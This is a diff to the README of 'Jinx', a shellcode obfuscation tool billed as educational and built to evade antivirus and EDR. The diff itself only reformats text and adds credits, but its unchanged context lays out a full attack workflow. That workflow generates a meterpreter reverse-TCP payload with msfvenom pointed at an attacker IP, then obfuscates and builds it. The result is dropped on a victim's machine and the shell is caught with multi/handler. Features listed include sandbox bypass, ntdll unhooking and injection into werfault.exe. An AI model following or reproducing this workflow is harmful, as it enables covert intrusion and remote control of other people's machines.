@@ -1,12 +1,12 @@
 # Jinx (For Educational Purposes Only)
 ## Shellcode obfuscation tool to avoid AV/EDR
-[![Python 3.10.4](https://img.shields.io/badge/python-3.10.4-yellow.svg)](https://www.python.org/) [![](https://img.shields.io/badge/C%2B%2B-14-blue)](https://visualstudio.microsoft.com/vs/features/cplusplus/)
+[![Python 3.10.4](https://img.shields.io/badge/Python-3.10.4-yellow.svg)](https://www.python.org/) [![C++ 14](https://img.shields.io/badge/C%2B%2B-14-blue)](https://visualstudio.microsoft.com/vs/features/cplusplus/) [![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](https://opensource.org/licenses/MIT)
+
 ## Features
- 
-- Custom Sleep Function - to bypass sandbox.
-- Obfuscation - base64 encoding and xor encryption with randomly generated key.
-- DLL Unhooking - full unhook of ntdll.dll.
-- Process Injection - injecting the payload to werfault.exe.
+- Custom Sleep Function - to bypass sandbox
+- Obfuscation - base64 encoding and xor encryption with randomly generated key
+- DLL Unhooking - full unhook of ntdll.dll
+- Process Injection - injecting the payload to werfault.exe
 
 ## Installation and use
 Jinx require [Python3](https://www.python.org/) and C++ compiler to run (we will be using [Visual Studio](https://visualstudio.microsoft.com/vs/features/cplusplus/))
@@ -17,7 +17,6 @@ msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=<Attacker IP> LPORT=1337 -
 ```
 
 Next we will use the obfuscator.py tool to obfuscate the shellcode:
-
 ```bash
 python3 obfuscator.py <Path to the shellcode>/shellcode
 ```
@@ -31,6 +30,9 @@ Open Visual Studio create a project and import the files as follow:
 
 Build The project and drop the executable on the victim's machine.
 
-On the attacker's machine use metasploit's multi/handler on port 1337
-<br>
-and on the victim's machine execute Jinx.
+On the attacker's machine use metasploit's multi/handler on port 1337 and on the victim's machine execute Jinx.
+
+## Credits
+[RonKon](https://github.com/RonKonis) - Development
+[dkonis](https://github.com/dkonis) - Research & Development
+[SheL3G](https://github.com/SheL3G) - Research
